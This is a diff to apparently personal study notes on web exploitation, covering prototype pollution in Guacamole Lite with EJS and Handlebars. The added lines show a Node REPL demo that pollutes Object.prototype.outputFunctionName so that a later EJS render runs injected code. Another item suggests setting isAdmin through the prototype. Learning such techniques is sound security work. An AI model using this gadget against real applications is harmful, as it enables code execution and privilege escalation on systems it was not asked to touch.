@@ -166,9 +166,21 @@ Reference : https://fetch.spec.whatwg.org/#cors-request
   	9. 
 12.  Guacamole Lite Prototype Pollution	
 	1. Object Prototype - https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Objects/Object_prototypes. The respectivitly would be the object class prototype, student prototype and s object directly.
-	2. Module with EJS, xxx and xxx.
- 	3. 
-  	4. 
+	2. Module with EJS, Handlebars.
+ 	3. Testing the template enginee with the function you found in the code.
+  > ejs  = require("ejs")
+...
+> ejs.render("Hello, <%= foo %>", {"foo":"world"})
+'Hello, world'
+
+> {}.__proto__.outputFunctionName = "x = 1; console.log('haxhaxhax') ; y"
+"x = 1; console.log('haxhaxhax') ; y"
+
+> ejs.render("Hello, <%= foo %>", {"foo":"world"})
+haxhaxhax
+'Hello, world'
+
+  	4. Handlebars
    	5. Prototype Pollution Exploitation - Application and Library dependent. Try to find if that possible to set isAdmin to true in the Object prototype. <br>
 	6. Prototype extends the DOM - http://prototypejs.org/learn/extensions
  	7.
